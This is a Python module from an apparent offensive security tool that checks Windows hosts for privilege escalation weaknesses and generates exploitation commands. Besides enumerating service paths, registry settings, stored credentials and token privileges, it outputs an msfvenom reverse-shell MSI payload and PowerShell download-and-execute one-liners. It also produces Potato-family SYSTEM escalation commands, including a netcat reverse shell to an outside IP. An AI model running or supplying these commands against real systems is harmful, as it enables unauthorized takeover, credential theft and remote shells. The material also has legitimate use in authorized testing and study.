#!/usr/bin/env python3
"""
NexusPen - Windows Privilege Escalation Module
================================================
Windows privilege escalation detection and exploitation.
"""

import subprocess
import os
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

console = Console()


@dataclass
class PrivEscVector:
    """Privilege escalation vector."""
    name: str
    description: str
    severity: str
    exploit_method: str
    affected_path: Optional[str] = None
    cve: Optional[str] = None


class WindowsPrivEsc:
    """
    Windows privilege escalation checker.
    """
    
    # Known vulnerable services
    VULNERABLE_SERVICES = {
        'spoolsv': 'Print Spooler - PrintNightmare (CVE-2021-34527)',
        'wsearch': 'Windows Search - Local Privilege Escalation',
        'upnphost': 'UPnP Device Host - weak permissions',
    }
    
    def __init__(self):
        self.vectors: List[PrivEscVector] = []
    
    def check_all(self) -> List[PrivEscVector]:
        """Run all privilege escalation checks."""
        console.print("\n[bold red]═══════════════════════════════════════════════════════════[/bold red]")
        console.print("[bold red]           WINDOWS PRIVILEGE ESCALATION CHECK              [/bold red]")
        console.print("[bold red]═══════════════════════════════════════════════════════════[/bold red]")
        
        self.check_unquoted_service_paths()
        self.check_weak_service_permissions()
        self.check_always_install_elevated()
        self.check_autologon()
        self.check_stored_credentials()
        self.check_scheduled_tasks()
        self.check_writable_paths()
        self.check_token_privileges()
        self.check_uac_bypass()
        
        self.display_results()
        return self.vectors
    
    def check_unquoted_service_paths(self) -> List[PrivEscVector]:
        """Check for unquoted service paths."""
        console.print("\n[cyan]🔍 Checking unquoted service paths...[/cyan]")
        
        vectors = []
        
        try:
            result = subprocess.run(
                ['wmic', 'service', 'get', 'name,displayname,pathname,startmode'],
                capture_output=True, text=True, timeout=30
            )
            
            for line in result.stdout.split('\n'):
                if 'Program Files' in line or 'Program Files (x86)' in line:
                    # Check if path is unquoted and contains spaces
                    if '"' not in line and ' ' in line:
                        parts = line.split()
                        if parts:
                            vector = PrivEscVector(
                                name='Unquoted Service Path',
                                description=f'Service: {parts[0]}',
                                severity='high',
                                exploit_method='Place malicious exe in path before space',
                                affected_path=line
                            )
                            vectors.append(vector)
                            self.vectors.append(vector)
                            console.print(f"[red]  ⚠️ {parts[0]}[/red]")
                            
        except Exception as e:
            console.print(f"[dim]Error: {e}[/dim]")
        
        return vectors
    
    def check_weak_service_permissions(self) -> List[PrivEscVector]:
        """Check for weak service permissions."""
        console.print("\n[cyan]🔍 Checking weak service permissions...[/cyan]")
        
        vectors = []
        
        # Use accesschk if available
        try:
            result = subprocess.run(
                ['accesschk.exe', '-uwcqv', 'Everyone', '*'],
                capture_output=True, text=True, timeout=60
            )
            
            if 'RW' in result.stdout or 'SERVICE_ALL_ACCESS' in result.stdout:
                for line in result.stdout.split('\n'):
                    if 'RW' in line:
                        vector = PrivEscVector(
                            name='Weak Service Permissions',
                            description=line.strip(),
                            severity='critical',
                            exploit_method='Modify service binary path',
                        )
                        vectors.append(vector)
                        self.vectors.append(vector)
                        console.print(f"[red]  ⚠️ {line.strip()}[/red]")
                        
        except FileNotFoundError:
            console.print("[dim]  accesschk.exe not found - skipping[/dim]")
        except Exception as e:
            console.print(f"[dim]Error: {e}[/dim]")
        
        return vectors
    
    def check_always_install_elevated(self) -> Optional[PrivEscVector]:
        """Check for AlwaysInstallElevated."""
        console.print("\n[cyan]🔍 Checking AlwaysInstallElevated...[/cyan]")
        
        try:
            # Check HKLM
            result1 = subprocess.run(
                ['reg', 'query', 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer', '/v', 'AlwaysInstallElevated'],
                capture_output=True, text=True, timeout=10
            )
            
            # Check HKCU
            result2 = subprocess.run(
                ['reg', 'query', 'HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer', '/v', 'AlwaysInstallElevated'],
                capture_output=True, text=True, timeout=10
            )
            
            if '0x1' in result1.stdout and '0x1' in result2.stdout:
                vector = PrivEscVector(
                    name='AlwaysInstallElevated',
                    description='MSI packages always install with elevated privileges',
                    severity='critical',
                    exploit_method='msfvenom -p windows/meterpreter/reverse_tcp -f msi > shell.msi'
                )
                self.vectors.append(vector)
                console.print("[red]  ⚠️ AlwaysInstallElevated enabled![/red]")
                return vector
                
        except Exception as e:
            console.print(f"[dim]Error: {e}[/dim]")
        
        return None
    
    def check_autologon(self) -> Optional[PrivEscVector]:
        """Check for stored autologon credentials."""
        console.print("\n[cyan]🔍 Checking autologon credentials...[/cyan]")
        
        try:
            result = subprocess.run(
                ['reg', 'query', 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'],
                capture_output=True, text=True, timeout=10
            )
            
            if 'DefaultPassword' in result.stdout:
                vector = PrivEscVector(
                    name='AutoLogon Credentials',
                    description='Password stored in registry',
                    severity='critical',
                    exploit_method='Read DefaultUserName and DefaultPassword from registry'
                )
                self.vectors.append(vector)
                console.print("[red]  ⚠️ AutoLogon credentials found![/red]")
                return vector
                
        except Exception as e:
            console.print(f"[dim]Error: {e}[/dim]")
        
        return None
    
    def check_stored_credentials(self) -> List[PrivEscVector]:
        """Check for stored credentials."""
        console.print("\n[cyan]🔍 Checking stored credentials...[/cyan]")
        
        vectors = []
        
        # cmdkey
        try:
            result = subprocess.run(['cmdkey', '/list'], capture_output=True, text=True, timeout=10)
            
            if 'Target:' in result.stdout:
                vector = PrivEscVector(
                    name='Stored Credentials',
                    description='Credentials Manager entries found',
                    severity='medium',
                    exploit_method='runas /savecred /user:TARGET_USER cmd.exe'
                )
                vectors.append(vector)
                self.vectors.append(vector)
                console.print("[yellow]  ⚠️ Stored credentials found[/yellow]")
                
        except Exception as e:
            console.print(f"[dim]Error: {e}[/dim]")
        
        return vectors
    
    def check_scheduled_tasks(self) -> List[PrivEscVector]:
        """Check for exploitable scheduled tasks."""
        console.print("\n[cyan]🔍 Checking scheduled tasks...[/cyan]")
        
        vectors = []
        
        try:
            result = subprocess.run(
                ['schtasks', '/query', '/fo', 'LIST', '/v'],
                capture_output=True, text=True, timeout=60
            )
            
            current_task = {}
            for line in result.stdout.split('\n'):
                if 'TaskName:' in line:
                    current_task = {'name': line.split(':')[1].strip()}
                elif 'Task To Run:' in line:
                    current_task['path'] = line.split(':')[1].strip()
                elif 'Run As User:' in line:
                    user = line.split(':')[1].strip().upper()
                    if 'SYSTEM' in user and current_task.get('path'):
                        # Check if we can write to the path
                        path = current_task.get('path', '')
                        if os.access(os.path.dirname(path), os.W_OK) if path else False:
                            vector = PrivEscVector(
                                name='Writable Scheduled Task',
                                description=f"Task: {current_task.get('name')}",
                                severity='critical',
                                exploit_method='Replace task binary with malicious one',
                                affected_path=path
                            )
                            vectors.append(vector)
                            self.vectors.append(vector)
                            console.print(f"[red]  ⚠️ Writable task: {current_task.get('name')}[/red]")
                            
        except Exception as e:
            console.print(f"[dim]Error: {e}[/dim]")
        
        return vectors
    
    def check_writable_paths(self) -> List[PrivEscVector]:
        """Check for writable system paths."""
        console.print("\n[cyan]🔍 Checking writable paths...[/cyan]")
        
        vectors = []
        
        system_paths = [
            'C:\\Windows\\System32',
            'C:\\Windows',
            'C:\\Program Files',
            'C:\\Program Files (x86)',
        ]
        
        for path in system_paths:
            if os.path.exists(path):
                try:
                    if os.access(path, os.W_OK):
                        vector = PrivEscVector(
                            name='Writable System Path',
                            description=f'Writable: {path}',
                            severity='high',
                            exploit_method='DLL hijacking or binary replacement',
                            affected_path=path
                        )
                        vectors.append(vector)
                        self.vectors.append(vector)
                        console.print(f"[red]  ⚠️ Writable: {path}[/red]")
                except:
                    pass
        
        return vectors
    
    def check_token_privileges(self) -> List[PrivEscVector]:
        """Check for exploitable token privileges."""
        console.print("\n[cyan]🔍 Checking token privileges...[/cyan]")
        
        vectors = []
        
        dangerous_privs = {
            'SeImpersonatePrivilege': 'Potato attacks (JuicyPotato, RoguePotato)',
            'SeAssignPrimaryTokenPrivilege': 'Token manipulation',
            'SeBackupPrivilege': 'Read any file (SAM/SYSTEM)',
            'SeRestorePrivilege': 'Write any file',
            'SeDebugPrivilege': 'Inject into any process',
            'SeTakeOwnershipPrivilege': 'Take ownership of files',
            'SeLoadDriverPrivilege': 'Load vulnerable driver',
        }
        
        try:
            result = subprocess.run(['whoami', '/priv'], capture_output=True, text=True, timeout=10)
            
            for priv, exploit in dangerous_privs.items():
                if priv in result.stdout and 'Enabled' in result.stdout:
                    vector = PrivEscVector(
                        name=f'Token Privilege: {priv}',
                        description=exploit,
                        severity='critical',
                        exploit_method=exploit
                    )
                    vectors.append(vector)
                    self.vectors.append(vector)
                    console.print(f"[red]  ⚠️ {priv} - {exploit}[/red]")
                    
        except Exception as e:
            console.print(f"[dim]Error: {e}[/dim]")
        
        return vectors
    
    def check_uac_bypass(self) -> Dict:
        """Check UAC status and bypass potential."""
        console.print("\n[cyan]🔍 Checking UAC status...[/cyan]")
        
        uac_info = {}
        
        try:
            result = subprocess.run(
                ['reg', 'query', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System'],
                capture_output=True, text=True, timeout=10
            )
            
            for line in result.stdout.split('\n'):
                if 'EnableLUA' in line:
                    uac_info['enabled'] = '0x1' in line
                elif 'ConsentPromptBehaviorAdmin' in line:
                    uac_info['prompt_behavior'] = line.split()[-1]
            
            if not uac_info.get('enabled'):
                console.print("[green]  ✓ UAC disabled[/green]")
            else:
                console.print("[yellow]  ⚠️ UAC enabled[/yellow]")
                
        except Exception as e:
            console.print(f"[dim]Error: {e}[/dim]")
        
        return uac_info
    
    def display_results(self):
        """Display all findings."""
        if not self.vectors:
            console.print("\n[green]No privilege escalation vectors found![/green]")
            return
        
        table = Table(title=f"PrivEsc Vectors ({len(self.vectors)})", show_header=True,
                     header_style="bold red")
        table.add_column("Name", style="cyan", width=25)
        table.add_column("Severity", width=10)
        table.add_column("Description", width=40)
        
        for vector in self.vectors:
            sev_color = {'critical': 'red', 'high': 'orange1', 'medium': 'yellow', 'low': 'green'}.get(vector.severity, 'white')
            table.add_row(
                vector.name[:25],
                f"[{sev_color}]{vector.severity.upper()}[/{sev_color}]",
                vector.description[:40]
            )
        
        console.print(table)
    
    @staticmethod
    def generate_winpeas_command() -> str:
        """Generate WinPEAS command."""
        return '''
# Download and run WinPEAS:
# From PowerShell:
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')

# Or download binary:
certutil -urlcache -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe winpeas.exe
.\\winpeas.exe
'''
    
    @staticmethod
    def generate_powerup_command() -> str:
        """Generate PowerUp command."""
        return '''
# Download and run PowerUp:
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks
'''


class PotatoExploits:
    """
    Potato family exploits for SeImpersonate privilege.
    """
    
    @staticmethod
    def juicy_potato(clsid: str = '{4991d34b-80a1-4291-83b6-3328366b9097}',
                    listener_ip: str = '127.0.0.1',
                    listener_port: int = 9999) -> str:
        """Generate JuicyPotato command."""
        return f'''
# JuicyPotato (Windows 7-10 before 1809)
JuicyPotato.exe -l {listener_port} -p c:\\windows\\system32\\cmd.exe -a "/c \\\\{listener_ip}\\share\\shell.exe" -t * -c {clsid}

# Common CLSIDs:
# Windows 10: {{4991d34b-80a1-4291-83b6-3328366b9097}}
# Windows 7: {{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}}
'''
    
    @staticmethod
    def rogue_potato(listener_ip: str, listener_port: int = 9999) -> str:
        """Generate RoguePotato command."""
        return f'''
# RoguePotato (Windows 10 1809+)
# On attacker: 
socat tcp-listen:135,reuseaddr,fork tcp:{listener_ip}:{listener_port}

# On target:
RoguePotato.exe -r {listener_ip} -e "cmd.exe /c powershell -e <BASE64_PAYLOAD>" -l 9999
'''
    
    @staticmethod
    def sweet_potato() -> str:
        """Generate SweetPotato command."""
        return '''
# SweetPotato (Modern combined potato)
SweetPotato.exe -p c:\\windows\\system32\\cmd.exe -a "/c whoami > C:\\temp\\output.txt"

# Or with reverse shell:
SweetPotato.exe -p c:\\windows\\system32\\cmd.exe -a "/c powershell -e <BASE64_PAYLOAD>"
'''
    
    @staticmethod
    def print_spoofer() -> str:
        """Generate PrintSpoofer command."""
        return '''
# PrintSpoofer (SeImpersonate on Windows 10/Server 2016/2019)
PrintSpoofer.exe -i -c cmd.exe

# With command:
PrintSpoofer.exe -c "c:\\temp\\shell.exe"
'''
    
    @staticmethod
    def god_potato() -> str:
        """Generate GodPotato command."""
        return '''
# GodPotato (Latest universal potato - 2023+)
GodPotato.exe -cmd "cmd /c whoami"

# Reverse shell:
GodPotato.exe -cmd "cmd /c c:\\temp\\nc.exe 10.10.10.10 4444 -e cmd.exe"
'''
